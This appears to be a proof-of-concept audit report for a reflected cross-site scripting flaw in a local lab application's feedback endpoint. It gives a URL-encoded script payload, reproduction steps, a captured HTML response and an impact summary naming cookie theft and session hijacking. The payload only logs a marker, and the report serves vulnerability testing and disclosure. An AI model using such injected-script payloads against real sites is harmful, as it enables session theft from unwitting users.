# Proof of Concept: Reflected Cross-Site Scripting (OWASP A03:2021)

**Vulnerability Type:** Injection (Reflected Cross-Site Scripting)  
**Affected Component:** `/api/feedback?msg={message}`  
**Severity:** MEDIUM (CVSS 6.1 - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)  
**Target:** `http://127.0.0.1:3000/api/feedback?msg=%3Cscript%3Econsole.log('AuditorXSSProof')%3C%2Fscript%3E`  

## 1. Technical Vulnerability Description
The feedback endpoint renders user input directly into an HTML response body without contextual encoding or input filtering. The response header `Content-Type: text/html` causes client browsers to parse and execute embedded JavaScript.

## 2. Reproduction Steps
1. Navigate to: `http://127.0.0.1:3000/api/feedback?msg=%3Cscript%3Econsole.log('AuditorXSSProof')%3C%2Fscript%3E`.
2. Inspect the HTTP response stream to verify unescaped script tag presence.

## 3. Sanitized HTTP Response Evidence
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: VulnerableLab/1.0

<!DOCTYPE html>
<html>
  <head><title>Lab Feedback Reflection</title></head>
  <body>
    <h2>Auditor Feedback Viewer</h2>
    <div id="feedback-display"><script>console.log('AuditorXSSProof')</script></div>
  </body>
</html>
```

## 4. Security Impact
An attacker can craft a phishing link containing a malicious JavaScript payload. When opened by an authenticated victim, the script executes within the victim's session context, enabling cookie theft, session hijacking, or DOM defacement.
